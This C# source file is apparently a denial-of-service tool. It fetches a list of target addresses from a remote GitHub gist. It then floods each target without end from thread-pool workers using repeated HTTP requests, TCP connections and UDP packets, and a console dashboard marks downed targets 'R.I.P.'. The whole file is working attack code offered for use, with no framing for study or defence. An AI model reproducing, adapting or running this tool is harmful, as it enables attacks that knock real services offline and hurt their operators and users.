using System.Net;

using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net.Sockets;

namespace DB
{
    class Program
    {
        private static ConcurrentDictionary<string, string> results = new ConcurrentDictionary<string, string>();

        public static int Main(string[] args)
        {
            var client = new WebClient();

            string targetsList;

            try
            {
                targetsList = client.DownloadString("https://gist.githubusercontent.com/givethemhell/8885277d358bfea7bee6b60dbcb5086c/raw/");
            }

            catch (Exception ex)
            {
                Console.Error.WriteLine("Failed to download list of targets");
                return 1;
            }

            string[] targets = null; ;

            try
            {
                targets = targetsList.Split("\n", StringSplitOptions.RemoveEmptyEntries)
                    .Distinct()
                    .ToArray();
            }

            catch (Exception ex)
            {
                Console.Error.WriteLine("Failed to parse list of targets: " + ex.Message);

                return 2;
            }

            CancellationTokenSource source = new CancellationTokenSource();

            var timer = new Timer((_) =>
            {
                var items = results.ToList().OrderBy(p => p.Key);
                Console.Clear();

                foreach (var pair in items)
                {
                    Console.WriteLine($"{pair.Key} - {pair.Value}");
                }
            },
            null,
            TimeSpan.Zero,
            TimeSpan.FromSeconds(1));

            var protocols = targets.GroupBy(address =>
            {
                if (address.StartsWith("http"))
                {
                    return "http";
                }

                if (address.StartsWith("tcp"))
                {
                    return "tcp";
                }

                if (address.StartsWith("udp"))
                {
                    return "udp";
                }

                return "http";
            });


            var http = protocols.Single(group => group.Key == "http");
            foreach (var url in http)
            {
                ThreadPool.UnsafeQueueUserWorkItem((_) => StartHTTP(url, source.Token), false);
            }

            var tcps = protocols.Single(group => group.Key == "tcp");
            foreach (var url in tcps)
            {
                ThreadPool.UnsafeQueueUserWorkItem((_) => StartTCP(url, source.Token), false);
            }

            var udp = protocols.Single(group => group.Key == "udp");
            foreach (var url in udp)
            {
                ThreadPool.UnsafeQueueUserWorkItem((_) => StartUDP(url, source.Token), false);
            }

            while (true) { }

            source.Cancel();

            return 0;
        }

        public static void StartHTTP(string url, CancellationToken token)
        {
            var client = new WebClient();
            client.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
            var stopWatch = new Stopwatch();

            while (!token.IsCancellationRequested)
            {
                var isDead = false;
                try
                {
                    stopWatch.Restart();
                    client.DownloadString(url);
                }

                catch (Exception ex)
                {
                    isDead = true;
                    Thread.Sleep(TimeSpan.FromSeconds(5));
                }

                finally
                {
                    stopWatch.Stop();
                }

                var res = isDead ? "R.I.P. " + stopWatch.Elapsed.ToString() : stopWatch.Elapsed.ToString();

                results.AddOrUpdate(url, res, (_, _1) => res);
            }
            results.Remove(url, out string val);
        }

        public static void StartTCP(string url, CancellationToken token)
        {
            var stopWatch = new Stopwatch();

            url = url.Substring("tcp://".Length);
            var parts = url.Split(":");
            if (parts.Length != 2)
            {
                Console.Error.WriteLine($"Cannot parse url ${url}");
                return;
            }

            var data = System.Text.Encoding.ASCII.GetBytes("test");

            string address = null;
            int port = 0;

            try
            {
                address = parts[0];
                port = int.Parse(parts[1]);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"Cannot parse url ${url}, ${ex.ToString()}");
                return;
            }

            while (!token.IsCancellationRequested)
            {
                var isDead = false;
                try
                {
                    stopWatch.Restart();
                    //-----
                    var client = new TcpClient(address, port);
                    using (var stream = client.GetStream())
                    { 
                        stream.Write(data, 0, data.Length);
                    }
                }

                catch (Exception ex)
                {
                    isDead = true;
                    Thread.Sleep(TimeSpan.FromSeconds(5));
                }

                finally
                {
                    stopWatch.Stop();
                }

                var res = isDead ? "R.I.P. " + stopWatch.Elapsed.ToString() : stopWatch.Elapsed.ToString();

                results.AddOrUpdate(url, res, (_, _1) => res);
            }
            results.Remove(url, out string val);
        }

        public static void StartUDP(string url, CancellationToken token)
        {
            var stopWatch = new Stopwatch();

            url = url.Substring("udp://".Length);
            var parts = url.Split(":");
            if (parts.Length != 2)
            {
                Console.Error.WriteLine($"Cannot parse url ${url}");
                return;
            }

            var data = System.Text.Encoding.ASCII.GetBytes("test");

            string address = null;
            int port = 0;

            try
            {
                address = parts[0];
                port = int.Parse(parts[1]);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"Cannot parse url ${url}, ${ex.ToString()}");
                return;
            }

            while (!token.IsCancellationRequested)
            {
                var isDead = false;
                try
                {
                    stopWatch.Restart();
                    //-----
                    var client = new UdpClient(address, port);
                    var a = client.Send(data);
                    Thread.Sleep(1);
                }

                catch (Exception ex)
                {
                    isDead = true;
                    Thread.Sleep(TimeSpan.FromSeconds(5));
                }

                finally
                {
                    stopWatch.Stop();
                }

                var res = isDead ? "R.I.P. " + stopWatch.Elapsed.ToString() : stopWatch.Elapsed.ToString();

                results.AddOrUpdate(url, res, (_, _1) => res);
            }
            results.Remove(url, out string val);
        }
    }
}